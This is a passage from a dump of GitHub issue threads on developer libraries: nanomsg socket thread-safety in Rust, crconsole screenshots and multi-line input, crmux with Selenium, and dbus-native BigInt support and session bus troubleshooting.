- a middle ground through a `pub unsafe fn` to create a Rust socket from a C socket with a huge warning in the doc comments.

I'm not in favor of option 2 because I don't want to find myself in the situation mentioned above. And it looks like Rust is all about safety, but that's just my personal opinion here.
From the [nanomsg documentation](http://nanomsg.org/documentation-zeromq.html) _... using a single socket from multiple threads in parallel is still discouraged ..._. 
Maybe we could just wait for someone to come up with a real world use case and see then how to handle it.
</Body>
    </Comment>
    <Comment>
      <Owner>thehydroimpulse</Owner>
      <Body>Yeah, I think that's a good approach. I definitely want nanomsg to be as safe as possible and I think not allowing clone would do this.
</Body>
    </Comment>
    <Comment>
      <Owner>Parakleta</Owner>
      <Body>I've checked the C code and I'm confident that the library is properly thread-safe.  Sockets are created under a global lock, and then interacted with under a private mutex.

I think you're right that you cannot have Clone/Copy because you have Drop and this is good.

I think the only mistake in the current implementation with regards to multithreading is that you implement the `Read` and `Write` traits.  These are not the correct traits for this since nanomsg is packed based rather than stream based.  Some of the derived methods actually do random weird things because `recv` always pulls a message and throws away the unused portion, so things like the `Read` iterators will just grab the first byte of each message rather than iterating through the message.  Please see `std::net::UdpSocket` as an alternative.

Once the `Read` and `Write` traits are removed you can then also remove all mutable accesses (except for `Drop`) and then it becomes trivial to wrap the socket in an `Arc` and pass it between threads.
</Body>
    </Comment>
    <Comment>
      <Owner>blabaere</Owner>
      <Body>Your remark about the `Read` and `Write` traits is interesting, even without considering the multi-threading part. I remember we already had to fix a bug related to the way these traits are used in `std`.

Regarding the removal of mutable accesses I think we need to review all socket methods and decide which we should fix. For example I'm not sure I would make `bind` and `connect` immutable. But I agree `read` and `write` should follow the `UdpSocket` example.
</Body>
    </Comment>
    <Comment>
      <Owner>Parakleta</Owner>
      <Body>`bind` and `connect` are the cases I thought about being made mutable too, but then I realised that was just a feeling and not based on any logical argument I could make.  `bind` and `connect` don't mutate anything that Rust can see and they're threadsafe.  It doesn't matter which order they are called in with regards to other methods in a strict program correctness sense, and if the programmer requires an ordering they should enforce it themselves, not through an API.

Consider an example where `bind` and `connect` may be interspersed with other actions, a bus topology network with a kind of mesh connection strategy.  A new client would connect to some other unit in the mesh and then send a broadcast "hello" message through that unit that would forward it to everyone it knows.  The recipients of that message could in a thread, recieve the message, connect to the new unit, and send it a welcome message.  I can't make any argument for why a mutex lock would need to occur around the `connect` in that scenario.
</Body>
    </Comment>
    <Comment>
      <Owner>blabaere</Owner>
      <Body>I think that having mutability stated in signatures is not only about multi-threading, or pleasing the compiler or event observable effects in a program but also about communicating intents to developers using a library, and providing some guarantees. In the case of a library depending on nanomsg, let's call it X, borrowing a socket or a mutable socket would convey two different meanings. If `connect` and `bind` are requiring a mutable borrow, as a program developer using X and nanomsg, I could safely pass a configured pub socket, knowing it will be sending data to peers I control, and that X will not connect to some malicious subscriber, leaking all my precious data.  

I understand the need to support a scenario where a socket is configured on the fly, based on the program execution outcome, including the content of messages exchanged over this socket. This is completely legitimate and I think doing this from multiple threads falls in the shared mutability category which requires special care to handle, and Rust is just making it explicit.

As a conclusion, this is technically feasible because thread-safety is guaranteed by nanomsg implementation itself, but I'm not sure this is the right thing to do. @thehydroimpulse any opinion on this ?
</Body>
    </Comment>
    <Comment>
      <Owner>Parakleta</Owner>
      <Body>I find your argument compelling because I like the idea but I think digging deeper it's the wrong approach.  From the Rust documentation:

&gt; So, that&#8217;s the real definition of &#8216;immutability&#8217;: is this safe to have two pointers to? In Arc&lt;T&gt;&#8217;s case, yes: the mutation is entirely contained inside the structure itself. It&#8217;s not user facing. For this reason, it hands out &amp;T with clone(). If it handed out &amp;mut Ts, though, that would be a problem.

I suspect to get the kind of access control you might have to put the `bind` and `connect` methods in a separate trait and then the module X could `pub use` the socket and just `use` the trait.
</Body>
    </Comment>
    <Comment>
      <Owner>blabaere</Owner>
      <Body>Another simple (too simple maybe ?) view on that problem is to consider that each of the two threads owns its socket, and if a message received from one socket could requires the application to call `bind` or `connect` on the other socket, then the application could simple have the first thread tell the second what to do. One could set up a thread to read commands from a regular channel, where the commands would something like, `recv`, `send(msg)`, `bind(addr)`, `connect(addr)`.  
Would this kind of design solve your problem in a practical way ?
</Body>
    </Comment>
    <Comment>
      <Owner>Parakleta</Owner>
      <Body>I can already make the socket shareable between threads in a much simpler way using `Arc&lt;Mutex&lt;T&gt;&gt;`, my point was just that the `Mutex&lt;T&gt;` overhead is unnecessary because the underlying library already handles that for us, so we're doing the work twice and it's clumsy.
</Body>
    </Comment>
    <Comment>
      <Owner>blabaere</Owner>
      <Body>OK for removing all mutability markers then.
</Body>
    </Comment>
  </Issue_393>
  <Issue_394>
    <Repository>rollout</Repository>
    <Title>In-Browser?</Title>
    <Owner>thehydroimpulse</Owner>
    <Body>Can you use this module in browsers?

If so, is there a way to toggle features / select groups, etc.. from the URL?
</Body>
    <State>open</State>
    <Comment>
      <Owner>thehydroimpulse</Owner>
      <Body>No, there's currently no browser support for this module.
</Body>
    </Comment>
    <Comment>
      <Owner>ericelliott</Owner>
      <Body>Thanks. =)
</Body>
    </Comment>
  </Issue_394>
  <Issue_395>
    <Repository>rust-fsm</Repository>
    <Title>Recursion</Title>
    <Owner>thehydroimpulse</Owner>
    <Body>Hi
Your lib looks quite interesting. However, it uses recursion at each state change, and you can't assume rust will do tail call optimization. Did you consider, instead of recursing, have `switch` to return the new state ? There would be a blocking loop that get the new state and run it, so no stack problem.
</Body>
    <State>open</State>
    <Comment>
      <Owner>thehydroimpulse</Owner>
      <Body>Yeah, this is a pretty old library that I haven't had a chance to update. Having no recursion is definitely necessary!
</Body>
    </Comment>
    <Comment>
      <Owner>Yamakaky</Owner>
      <Body>If you don't mind, it's possible that one day I may find the time to update it ^^
</Body>
    </Comment>
    <Comment>
      <Owner>thehydroimpulse</Owner>
      <Body>@Yamakaky Oh of course not! Go right ahead.
</Body>
    </Comment>
  </Issue_395>
  <Issue_396>
    <Repository>abstractsocket</Repository>
    <Title>More general patching</Title>
    <Owner>sidorares</Owner>
    <Body>Instead of patching just net.createConnection, this should probably patch Socket.prototype.connect.
A way to also handle abstract socket servers (net.createServer or Socket.prototype.listen) might also be expected from users, but since that's not easy to fake with executing socat maybe a note for the incomplete functionality should be added to the README.md.
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>main reason this package exist was to provide a way to connect dbus client ( https://github.com/sidorares/node-dbus ) to session bus ( which is usually points to abstract socket ), but later I started using https://github.com/saghul/node-abstractsocket

I'm happy to accept PRs though if you think some changes might benefit others :)
</Body>
    </Comment>
  </Issue_396>
  <Issue_397>
    <Repository>crconsole</Repository>
    <Title>.Screen for full document height</Title>
    <Owner>sidorares</Owner>
    <Body>Any chance to use .screen for full loaded document height + width?</Body>
    <State>open</State>
    <Comment>
      <Owner>oltkkol</Owner>
      <Body>solution I'd like to add:&#13;
&#13;
    this.repl.defineCommand('screentofile', {&#13;
      help: 'saves screenshot to given file',&#13;
      action: function(fileName) {&#13;
        var fullPage = true;&#13;
&#13;
        self.client.send('Page.getLayoutMetrics', function(err, res){&#13;
          var metrics = res;&#13;
          var width   = Math.ceil( fullPage? metrics.contentSize.width : metrics.layoutViewport.clientWidth );&#13;
          var height  = Math.ceil( fullPage? metrics.contentSize.height: metrics.layoutViewport.clientHeight);&#13;
          var clip    = {x: 0, y: 0, width, height, scale: 1 };&#13;
&#13;
          self.client.Page.captureScreenshot( { clip }, function(err, res) {&#13;
            var binData = Buffer.from(res.data, 'base64');&#13;
&#13;
            fs.writeFile(fileName, binData, function(err) {&#13;
              if(err) {&#13;
                  self.writeLn( err );&#13;
              }&#13;
            }); &#13;
&#13;
            self.writeLn(fileName);&#13;
          });&#13;
        });&#13;
      }&#13;
    });</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>hi! yes, probably a good feature to add. Similar puppeteer code: https://github.com/GoogleChrome/puppeteer/blob/bd73e4b7b814f0a9df97158f9102e486618c6075/lib/Page.js#L678-L690</Body>
    </Comment>
  </Issue_397>
  <Issue_398>
    <Repository>crconsole</Repository>
    <Title>Request: Kill the chrome process on crconsole's exit</Title>
    <Owner>sidorares</Owner>
    <Body>Upon exiting the crconsole, the chrome process is left running. For example:

```
$ crconsole -s
Waiting for chrome to start: 
chrome://newtab/
&gt; SW registered
newtab&gt; .exit
^C
```

Does not close the browser. 
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>@1db8k it's a bit hard to figure out which process to kill - chrome forks after initial start and there are multiple processes to track
</Body>
    </Comment>
  </Issue_398>
  <Issue_399>
    <Repository>crconsole</Repository>
    <Title>Support multi line commands (was: Input a scope in crconsole)</Title>
    <Owner>sidorares</Owner>
    <Body>I think it would be better if we can type a scope in crconsole.
Just like typing in chrome dev tool and chrome-remote-interface's repl.

![02](https://f.cloud.github.com/assets/2769753/1417235/74c83e84-3f81-11e3-9fb8-200443756e91.png)

![03](https://f.cloud.github.com/assets/2769753/1417254/6193e614-3f82-11e3-9333-ad58662cf16f.png)
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>not sure if I get the idea. Are you talking about multi line input?
</Body>
    </Comment>
    <Comment>
      <Owner>ShawnHuang</Owner>
      <Body>Chrome dev tool's rule is multi line input. I think it's difficult to implement.
Chrome-remote-interface's repl used repl module,
and its rule that I guess is to detect some keywords (function, if, while) and to let users to complete code scope.
I can't differ crconsole which also use repl module from that, but I try to write a sample with the repl module that also has the same feature. 
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>multiline input would be tricky with repl/readline. Node starts 'multiline mode' when there is syntax error - see https://github.com/joyent/node/blob/master/lib/repl.js#L296

Not sure if that is desired behaviour at all. Maybe we should trigger this only by some errors, like "Unexpected end of input" 
</Body>
    </Comment>
    <Comment>
      <Owner>ShawnHuang</Owner>
      <Body>OK, I got it. Thanks for your reply
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Feel free to try to implement it yourself :)
</Body>
    </Comment>
    <Comment>
      <Owner>ShawnHuang</Owner>
      <Body>I will try it:)
</Body>
    </Comment>
    <Comment>
      <Owner>ShawnHuang</Owner>
      <Body>I try to replace the eval function with the following code, but I am not sure that there is no bugs at that code.
:)

https://github.com/sidorares/crconsole/blob/master/index.js#L272

```
    var err, result;                                                                                                            
    try{                                                                                                                        
      var script = require("vm").createScript(cmd.slice(1, -2), {                                                                            
        filename: filename,                                                                                                     
        displayErrors: false                                                                                                    
      });                                                                                                                       
    } catch (e){                                                                                                                
      err = e;                                                                                                                  
    }                                                                                                                           
    var mess = !!err;                                                                                                           
    if(mess) cb(err, result);                                                                                                   
    else{                                                                                                                       
      this.client.Runtime.evaluate({expression: cmd.slice(1, -2), generatePreview: true}, function(err, resp) {                              
        return cb(null, resp);                                                                                                  
      });                                                                                                                       
    }
```
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>It will throw exceptions for some valid code, for example if you reference on the right hand side variable which is defined in remote context but not defined locally. I suggest to use esprima and check if it can build complete AST as a flag
</Body>
    </Comment>
    <Comment>
      <Owner>ShawnHuang</Owner>
      <Body>Oh!! Let me think about it. Thank you!
</Body>
    </Comment>
  </Issue_399>
  <Issue_400>
    <Repository>crmux</Repository>
    <Title>Cannot connect to run Selenium tests and to Chrome inspector</Title>
    <Owner>sidorares</Owner>
    <Body>When I set `--remote-debugging-port=9222` using selenium-webdriver gem 3.8.0 and chromedriver-helper gem 1.1.0, which corresponds to the chromedriver-helper version 2.33.506106, I cannot get selenium to run.  It errors out with `Net::ReadTimeout`.  If I then set the port manually to 9222 in Selenium's gem files, I get the error:&#13;
&#13;
```&#13;
Selenium::WebDriver::Error::WebDriverError:&#13;
            unable to bind to locking port 9522 within 45 seconds&#13;
```&#13;
&#13;
Is there some pointer you could give here to get crmux working with Selenium?  I can boot up crmux and Chrome's inspect, but it doesn't help anything, since Selenium can't load the web page.</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>the error says port 9522 - is that the port crmux is listening?</Body>
    </Comment>
    <Comment>
      <Owner>jsilvestri</Owner>
      <Body>@sidorares yikes.  I don't have the initial code up, but I must have typo'd for that second error.  I only get the `Net::ReadTimeout` when I put `9222` everywhere.  I tried a few different ports as well as changing the `--listen` option for crmux.  It seems that whatever crmux is listening or working on, Selenium tries 1 port after this.&#13;
&#13;
Here is my selenium log (with selenium supposed to listen to 9222, and crmux running with default settings):&#13;
&#13;
2018-03-06 21:43:17 DEBUG Selenium Executing Process ["&lt;home&gt;/.rvm/gems/ruby-2.3.4/bin/chromedriver", "--port=9224"]&#13;
2018-03-06 21:43:17 DEBUG Selenium polling for socket on ["127.0.0.1", 9224]&#13;
2018-03-06 21:43:17 DEBUG Selenium polling for socket on ["127.0.0.1", 9224]&#13;
2018-03-06 21:43:17 DEBUG Selenium polling for socket on ["127.0.0.1", 9224]&#13;
2018-03-06 21:43:17 DEBUG Selenium polling for socket on ["127.0.0.1", 9224]&#13;
Starting ChromeDriver 2.33.506106 (8a06c39c4582fbfbab6966dbb1c38a9173bfb1a2) on port 9224&#13;
Only local connections are allowed.&#13;
2018-03-06 21:43:18 INFO Selenium -&gt; POST session&#13;
2018-03-06 21:43:18 INFO Selenium    &gt;&gt;&gt; http://127.0.0.1:9224/session | {"desiredCapabilities":{"browserName":"chrome","version":"","platform":"ANY","javascriptEnabled":true,"cssSelectorsEnabled":true,"takesScreenshot":false,"nativeEvents":false,"rotatable":false,"loggingPrefs":{"browser":"ALL"},"chromeOptions":{"args":["--disable-infobars","--no-sandbox","--remote-debugging-port=9222","--verbose","--log-path=/tmp/chromedriver.log","--headless","--window-size=1600,2400"],"prefs":{"homepage":"about:blank","profile.default_content_settings.popups":0,"download.default_directory":"/tmp/downloads"}}},"capabilities":{"firstMatch":[{"browserName":"chrome"}]}}&#13;
2018-03-06 21:43:18 DEBUG Selenium      &gt; {"Accept"=&gt;"application/json", "Content-Type"=&gt;"application/json; charset=utf-8", "Content-Length"=&gt;"616"}&#13;
2018-03-06 21:45:33 DEBUG Selenium Executing Process ["&lt;home&gt;/.rvm/gems/ruby-2.3.4/bin/chromedriver", "--port=9222"]&#13;
2018-03-06 21:45:33 DEBUG Selenium polling for socket on ["127.0.0.1", 9222]&#13;
2018-03-06 21:45:33 DEBUG Selenium polling for socket on ["127.0.0.1", 9222]&#13;
2018-03-06 21:45:33 DEBUG Selenium polling for socket on ["127.0.0.1", 9222]&#13;
2018-03-06 21:45:34 DEBUG Selenium polling for socket on ["127.0.0.1", 9222]&#13;
Starting ChromeDriver 2.33.506106 (8a06c39c4582fbfbab6966dbb1c38a9173bfb1a2) on port 9222&#13;
Only local connections are allowed.&#13;
2018-03-06 21:45:34 INFO Selenium -&gt; POST session&#13;
2018-03-06 21:45:34 INFO Selenium    &gt;&gt;&gt; http://127.0.0.1:9222/session | {"desiredCapabilities":{"browserName":"chrome","version":"","platform":"ANY","javascriptEnabled":true,"cssSelectorsEnabled":true,"takesScreenshot":false,"nativeEvents":false,"rotatable":false,"loggingPrefs":{"browser":"ALL"},"chromeOptions":{"args":["--disable-infobars","--no-sandbox","--remote-debugging-port=9222","--verbose","--log-path=/tmp/chromedriver.log","--headless","--window-size=1600,2400"],"prefs":{"homepage":"about:blank","profile.default_content_settings.popups":0,"download.default_directory":"/tmp/downloads"}}},"capabilities":{"firstMatch":[{"browserName":"chrome"}]}}&#13;
2018-03-06 21:45:34 DEBUG Selenium      &gt; {"Accept"=&gt;"application/json", "Content-Type"=&gt;"application/json; charset=utf-8", "Content-Length"=&gt;"616"}&#13;
2018-03-06 21:46:34 DEBUG Selenium Executing Process ["&lt;home&gt;/.rvm/gems/ruby-2.3.4/bin/chromedriver", "--port=9224"]&#13;
2018-03-06 21:46:34 DEBUG Selenium polling for socket on ["127.0.0.1", 9224]&#13;
2018-03-06 21:46:34 DEBUG Selenium polling for socket on ["127.0.0.1", 9224]&#13;
2018-03-06 21:46:34 DEBUG Selenium polling for socket on ["127.0.0.1", 9224]&#13;
2018-03-06 21:46:35 DEBUG Selenium polling for socket on ["127.0.0.1", 9224]&#13;
Starting ChromeDriver 2.33.506106 (8a06c39c4582fbfbab6966dbb1c38a9173bfb1a2) on port 9224&#13;
Only local connections are allowed.&#13;
2018-03-06 21:46:35 INFO Selenium -&gt; POST session&#13;
2018-03-06 21:46:35 INFO Selenium    &gt;&gt;&gt; http://127.0.0.1:9224/session | {"desiredCapabilities":{"browserName":"chrome","version":"","platform":"ANY","javascriptEnabled":true,"cssSelectorsEnabled":true,"takesScreenshot":false,"nativeEvents":false,"rotatable":false,"loggingPrefs":{"browser":"ALL"},"chromeOptions":{"args":["--disable-infobars","--no-sandbox","--remote-debugging-port=9222","--verbose","--log-path=/tmp/chromedriver.log","--headless","--window-size=1600,2400"],"prefs":{"homepage":"about:blank","profile.default_content_settings.popups":0,"download.default_directory":"/tmp/downloads"}}},"capabilities":{"firstMatch":[{"browserName":"chrome"}]}}&#13;
2018-03-06 21:46:35 DEBUG Selenium      &gt; {"Accept"=&gt;"application/json", "Content-Type"=&gt;"application/json; charset=utf-8", "Content-Length"=&gt;"616"}</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>if you start crmux with debug switch - does it print anything when Selenium tries to connect?</Body>
    </Comment>
    <Comment>
      <Owner>jsilvestri</Owner>
      <Body>it prints nothing at all to the screen :(</Body>
    </Comment>
  </Issue_400>
  <Issue_401>
    <Repository>dbus-native</Repository>
    <Title>Deprecate dbus-native</Title>
    <Owner>sidorares</Owner>
    <Body>Thanks for your work creating dbus-native.&#13;
&#13;
I have created a fork of the project called [dbus-next](https://github.com/acrisci/node-dbus-next) with many bugfixes and enhancements that I believe fixes many of the issues on your issue tracker as well as the following:&#13;
&#13;
* fully featured high-level and low-level interfaces&#13;
* a more intuitive type system&#13;
* comprehensive documentation for the public api&#13;
* integration tests for all library features&#13;
* used in six electron media players through the [mpris-service](https://github.com/emersion/mpris-service) library.&#13;
&#13;
I was wondering if you would deprecate this library and send your users my way. I am also open to merging the projects.&#13;
&#13;
Thanks.</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>hey @acrisci , thanks for your efforts ( I saw your email but didn't have time to respond, I'm sorry )&#13;
&#13;
Happy to see deprecate my version in favour of yours, or merge and move to https://github.com/dbusjs , whatewher you think is better</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>At current stage, is your code backwards compatible? Do you want to re-use npm name? If yes, whe can 1) mifrate "official" repo to dbusjs org 2) I'll add you publish rights to npm and you publish latest version of your code</Body>
    </Comment>
    <Comment>
      <Owner>acrisci</Owner>
      <Body>&gt; At current stage, is your code backwards compatible?&#13;
&#13;
Unfortunately no. I rewrote everything except the marshallers.&#13;
&#13;
&gt; Do you want to re-use npm name?&#13;
&#13;
I think this would be good because dbus-native has very high visibility.&#13;
&#13;
&gt; If yes, whe can 1) mifrate "official" repo to dbusjs org 2) I'll add you publish rights to npm and you publish latest version of your code&#13;
&#13;
This sounds good to me.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>&gt; Unfortunately no. I rewrote everything except the marshallers.&#13;
&#13;
I guess with enough of communication and major version change this is still possible</Body>
    </Comment>
    <Comment>
      <Owner>acrisci</Owner>
      <Body>With the latest [0.7.1](https://github.com/acrisci/node-dbus-next/releases/tag/v0.7.1) release of dbus-next, I think I'm ready to make the api stable so I'm ready to take action on this now.</Body>
    </Comment>
  </Issue_401>
  <Issue_402>
    <Repository>dbus-native</Repository>
    <Title>Update to @nornagon/put@0.0.7 to fix Buffer deprecation warning</Title>
    <Owner>sidorares</Owner>
    <Body>Once https://github.com/substack/node-put/pull/6 is merged we can switch back to the main "put", but that package hasn't been updated in 7 years so who knows if it ever will be merged &amp; released :)</Body>
    <State>open</State>
    <Comment>
      <Owner>nornagon</Owner>
      <Body>CI failures don't appear to be related to this change</Body>
    </Comment>
  </Issue_402>
  <Issue_403>
    <Repository>dbus-native</Repository>
    <Title>Very crude initial support for BigInt (if present)</Title>
    <Owner>sidorares</Owner>
    <Body>Inspired by https://github.com/sidorares/dbus-native/issues/248&#13;
&#13;
This an initial attempt to allow the use of BigInt (if it is available) without breaking backwards compatibility. At present it uses strings to convert between Long.js and BigInt. At some point that could probably be replaced with more efficient mathematic operations or some kind of BigInt functionality, but this is a start at least. (Perhaps in future, it will be primarily BigInt with Long.js as a fallback? Guess time will tell.)&#13;
&#13;
Not sure if there should be an option to always unmarshall to BigInt, or if automatically flipping from number to BigInt when needed is fine.</Body>
    <State>open</State>
    <Comment>
      <Owner>CyDragon80</Owner>
      <Body>On further thought, it would probably be more consistent and deterministic to have an option for 64 bit return types that is an enum of 'number', 'bigint', and 'longjs' (perhaps deprecate ReturnLongjs). The automagic flipping between number and bigint on certain conditions could potentially be confusing. Thoughts?</Body>
    </Comment>
    <Comment>
      <Owner>CyDragon80</Owner>
      <Body>Not seeing Travis results, but I did test on Node 6 and 10. BigInt specific tests only run on 10+ as BigInt is not defined previous to that and are automatically skipped.</Body>
    </Comment>
  </Issue_403>
  <Issue_404>
    <Repository>dbus-native</Repository>
    <Title>[proposal] Replace Long.js with native BigInt</Title>
    <Owner>sidorares</Owner>
    <Body>`BigInt` is a native way to represent 64 bit integers (dbus type `x`) in node.&#13;
&#13;
Available since version 10.8.0.&#13;
&#13;
https://node.green/#ESNEXT-candidate--stage-3--BigInt&#13;
&#13;
https://developers.google.com/web/updates/2018/05/bigint&#13;
&#13;
Do you see any issues with that?&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>I was thinking about it, but might be a bit too early?&#13;
Maybe OK to go with migger api changes ( async/await etc ) in major version.</Body>
    </Comment>
    <Comment>
      <Owner>CyDragon80</Owner>
      <Body>I created a PR https://github.com/sidorares/dbus-native/pull/252 with a potential interim solution to at least present the option of marshalling/unmarshalling BigInts when the feature is available. Over time it would probably make sense  to shift towards the native type.</Body>
    </Comment>
  </Issue_404>
  <Issue_405>
    <Repository>dbus-native</Repository>
    <Title>Is it possible to use this to implement an mpris client?</Title>
    <Owner>sidorares</Owner>
    <Body>Hi, I'm trying to move away from libdbus in my node program, and I'm wondering if it's possible to use this library as an mpris client? I only want to receive and send some basic messages like title, thumbnail, artist, and receive events like play/pause, next, and quit.</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>should be possible (anything is possible at messaging level, just a bit more verbose to program)</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>People definitely attempted to interact with mpris using this library, have a look at #102 #89 #121 #60</Body>
    </Comment>
  </Issue_405>
  <Issue_406>
    <Repository>dbus-native</Repository>
    <Title>firefly linux node 8.9.4 example fails unknown bus address</Title>
    <Owner>sidorares</Owner>
    <Body>I'm trying to get the module to run on a small embedded device. I've installed it as per instructions. I took the example below directly from the README.&#13;
&#13;
var dbus = require('dbus-native');&#13;
var sessionBus = dbus.sessionBus();&#13;
sessionBus.getService('org.freedesktop.Notifications').getInterface(&#13;
    '/org/freedesktop/Notifications',&#13;
    'org.freedesktop.Notifications', function(err, notifications) {&#13;
&#13;
    // dbus signals are EventEmitter events&#13;
    notifications.on('ActionInvoked', function() {&#13;
        console.log('ActionInvoked', arguments);&#13;
    });&#13;
    notifications.on('NotificationClosed', function() {&#13;
        console.log('NotificationClosed', arguments);&#13;
    });&#13;
    notifications.Notify('exampl', 0, '', 'summary 3', 'new message text', ['xxx yyy', 'test2', 'test3', 'test4'], [],  5, function(err, id) {&#13;
       //setTimeout(function() { n.CloseNotification(id, console.log); }, 4000);&#13;
    });&#13;
});&#13;
&#13;
It fails with the following error:&#13;
&#13;
/home/miker/test1/node_modules/dbus-native/index.js:22&#13;
  if (!busAddress) throw new Error('unknown bus address');&#13;
                   ^&#13;
&#13;
Error: unknown bus address&#13;
    at createStream (/home/miker/test1/node_modules/dbus-native/index.js:22:26)&#13;
    at createConnection (/home/miker/test1/node_modules/dbus-native/index.js:76:31)&#13;
    at Object.module.exports.createClient (/home/miker/test1/node_modules/dbus-native/index.js:136:20)&#13;
    at Object.module.exports.sessionBus (/home/miker/test1/node_modules/dbus-native/index.js:149:25)&#13;
    at Object.&lt;anonymous&gt; (/home/miker/test1/test.js:2:23)&#13;
    at Module._compile (module.js:643:30)&#13;
    at Object.Module._extensions..js (module.js:654:10)&#13;
    at Module.load (module.js:556:32)&#13;
    at tryModuleLoad (module.js:499:12)&#13;
    at Function.Module._load (module.js:491:3)&#13;
miker@firefly:~/test1$ node -v&#13;
v8.9.4&#13;
miker@firefly:~/test1$ npm -v&#13;
6.0.0&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>`sessionBus()` is a shortcut for "give me a client connected to address pointed by DBUS_SESSION_BUS_ADDRESS  env variable", and in your case it's probably not set. Usually it's [dbus-launch](https://dbus.freedesktop.org/doc/dbus-launch.1.html) job to set it correctly, you neet to check who is launching dbus-daemon and maybe set DBUS_SESSION_BUS_ADDRESS manually if it's not set</Body>
    </Comment>
    <Comment>
      <Owner>fastworks</Owner>
      <Body>I think you're correct, as I was running it from a shell and it appears to work when run in an xterm. One thing I wish for is better errors, or a troubleshooting type doc to help in these matters. I've spent the better part of the day trying to get notification of a USB mount event and I'm only slightly closer to a resolution.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>&gt; One thing I wish for is better errors, or a troubleshooting type doc&#13;
&#13;
Yes, fully agree with you. This is something that definitely needs improvement </Body>
    </Comment>
    <Comment>
      <Owner>fastworks</Owner>
      <Body>@sidorares I'm working on the udisk2 interface. Really, I just need to have a function called when a USB stick is inserted and the system mounts it (using automount). &#13;
&#13;
Using dbus-monitor I can see the following message for the insertion:&#13;
&#13;
```&#13;
signal time=1525065825.986584 sender=:1.59 -&gt; destination=(null destination) serial=2187 path=/org/freedesktop/UDisks2; interface=org.freedesktop.DBus.ObjectManager; member=InterfacesAdded&#13;
   object path "/org/freedesktop/UDisks2/block_devices/sdb1"&#13;
   array [&#13;
      dict entry(&#13;
         string "org.freedesktop.UDisks2.Block"&#13;
         array [&#13;
            dict entry(&#13;
               string "Device"&#13;
               variant                   array of bytes "/dev/sdb1" + \0&#13;
            )&#13;
            dict entry(&#13;
               string "PreferredDevice"&#13;
               variant                   array of bytes "/dev/sdb1" + \0&#13;
            )&#13;
            dict entry(&#13;
               string "Symlinks"&#13;
               variant                   array [&#13;
                     array of bytes "/dev/disk/by-id/usb-Lexar_microSD_RDR_000000000001-0:0-part1" + \0&#13;
                     array of bytes "/dev/disk/by-path/platform-xhci-hcd.9.auto-usb-0:1.1.3:1.0-scsi-0:0:0:0-part1" + \0&#13;
                     array of bytes "/dev/disk/by-uuid/3A60-044B" + \0&#13;
[SNIP]&#13;
```&#13;
&#13;
When the filesystem mount starts I see this:&#13;
&#13;
signal time=1525065831.741319 sender=:1.59 -&gt; destination=(null destination) serial=2190 path=/org/freedesktop/UDisks2; interface=org.freedesktop.DBus.ObjectManager; member=InterfacesAdded&#13;
   object path "/org/freedesktop/UDisks2/jobs/206"&#13;
   array [ &#13;
      dict entry(&#13;
         string "org.freedesktop.UDisks2.Job"&#13;
         array [ &#13;
            dict entry(&#13;
               string "Operation"        &#13;
               variant                   string "filesystem-mount"&#13;
            )&#13;
            dict entry(&#13;
               string "Progress"         &#13;
               variant                   double 0&#13;
            )&#13;
[SNIP]&#13;
&#13;
As job 206 runs, I see the mount point show up and the job completes.&#13;
&#13;
signal time=1525065831.775012 sender=:1.59 -&gt; destination=(null destination) serial=2191 path=/org/freedesktop/UDisks2/block_devices/sdb1; interface=org.freedesktop.DBus.Properties; member=PropertiesChanged&#13;
   string "org.freedesktop.UDisks2.Filesystem"&#13;
   array [&#13;
      dict entry(&#13;
         string "MountPoints"&#13;
         variant             array [&#13;
               array of bytes "/media/miker/3A60-044B" + \0&#13;
            ]&#13;
      )&#13;
   ]&#13;
   array [&#13;
   ]&#13;
signal time=1525065831.798591 sender=:1.59 -&gt; destination=(null destination) serial=2192 path=/org/freedesktop/UDisks2/jobs/206; interface=org.freedesktop.UDisks2.Job; member=Completed&#13;
   boolean true&#13;
   string ""&#13;
&#13;
The trouble is, I can't figure out how to get the contents of these through dbus-native. I've messed with the code for a good 6 hours and every way I've tried to call GetAll it either dies with an exception or just returns an undefined var. Can you give me any pointers?&#13;
&#13;
thanks</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>As these are all signal the easiest way is just to listen all messages and check if message is from service&#13;
&#13;
```js&#13;
var dbus = require('dbus-native');&#13;
var conn = dbus.createConnection();&#13;
conn.on('message', function(msg) { &#13;
  if (msg.path === '/org/freedesktop/UDisks2' &amp;&amp; msg.member === 'InterfacesAdded' ) {&#13;
     console.log('Interface added: ', msg.body);&#13;
  } &#13;
});&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>fastworks</Owner>
      <Body>Not sure why, but that code does not seem to fire at all. Adding debugging in there shows it never runs. Any ideas?&#13;
&#13;
var conn = dbus.createConnection();&#13;
conn.on('message', function(msg) {&#13;
console.log("Incoming: ",msg);&#13;
  if (msg.path === '/org/freedesktop/UDisks2' &amp;&amp; msg.member === 'InterfacesAdded' ) {&#13;
     console.log('Interface added: ', msg.body);&#13;
  }&#13;
});</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>I'll try to test this code in couple of hours when I beck home at my desktop computer</Body>
    </Comment>
    <Comment>
      <Owner>fastworks</Owner>
      <Body>This morning I tried a variety of things but the conn never seems to fire with messages. I'm not sure if it's a permissions thing or something else failing silently.</Body>
    </Comment>
    <Comment>
      <Owner>fastworks</Owner>
